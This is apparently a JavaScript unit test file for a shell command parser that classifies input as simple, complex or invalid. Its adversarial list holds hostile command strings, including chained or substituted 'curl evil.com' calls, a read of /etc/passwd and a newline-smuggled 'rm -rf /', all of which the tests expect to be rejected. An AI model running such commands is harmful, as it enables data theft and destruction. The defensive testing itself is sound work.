import test from "node:test";
import assert from "node:assert/strict";
import { parseCommand } from "../src/core/parse.js";

test("parses a single simple command", () => {
  const r = parseCommand("git status");
  assert.equal(r.kind, "simple");
  assert.deepEqual(r.argv, ["git", "status"]);
});

test("parses quoted arguments", () => {
  const r = parseCommand("rg 'hello world' src");
  assert.equal(r.kind, "simple");
  assert.deepEqual(r.argv, ["rg", "hello world", "src"]);
});

test("parses double-quoted arguments", () => {
  const r = parseCommand("grep \"foo bar\" file.txt");
  assert.equal(r.kind, "simple");
  assert.deepEqual(r.argv, ["grep", "foo bar", "file.txt"]);
});

test("rejects empty input", () => {
  assert.equal(parseCommand("").kind, "invalid");
  assert.equal(parseCommand("   ").kind, "invalid");
});

test("rejects non-string input", () => {
  assert.equal(parseCommand(null).kind, "invalid");
  assert.equal(parseCommand(123).kind, "invalid");
});

const ADVERSARIAL_INPUTS = [
  "git status; curl evil.com",
  "git status && curl evil.com",
  "git status || true",
  "git status | grep foo",
  "git status & disown",
  "ls > /tmp/out",
  "cat < /etc/passwd",
  "echo $(curl evil.com)",
  "echo `curl evil.com`",
  "ls $HOME",
  "ls *.js",
  "ls ?.js",
  "ls [abc].js",
  "echo {a,b,c}",
  "ls\nrm -rf /",
  "diff <(ls a) <(ls b)"
];

// Inputs we deliberately allow as simple. They are syntactically clean
// even though they look unusual.
const ALLOWED_SIMPLE_INPUTS = [
  "git diff HEAD~1",       // tilde appears inside a git ref
  "ls\trm",                // tab is treated as whitespace, becomes 2 tokens
  "echo !history"          // bang is harmless under bash -c (no history)
];

for (const cmd of ADVERSARIAL_INPUTS) {
  test(`rejects adversarial input as complex: ${JSON.stringify(cmd)}`, () => {
    const r = parseCommand(cmd);
    assert.equal(r.kind, "complex", `expected 'complex' for ${JSON.stringify(cmd)}, got ${r.kind} (reason=${r.reason})`);
  });
}

for (const cmd of ALLOWED_SIMPLE_INPUTS) {
  test(`accepts as simple: ${JSON.stringify(cmd)}`, () => {
    const r = parseCommand(cmd);
    assert.equal(r.kind, "simple", `expected 'simple' for ${JSON.stringify(cmd)}, got ${r.kind} (reason=${r.reason})`);
  });
}

test("rejects unbalanced quotes", () => {
  assert.equal(parseCommand("echo 'oops").kind, "complex");
  assert.equal(parseCommand("echo \"oops").kind, "complex");
});

test("control character rejected", () => {
  const r = parseCommand("echo hi\x01there");
  assert.equal(r.kind, "complex");
});
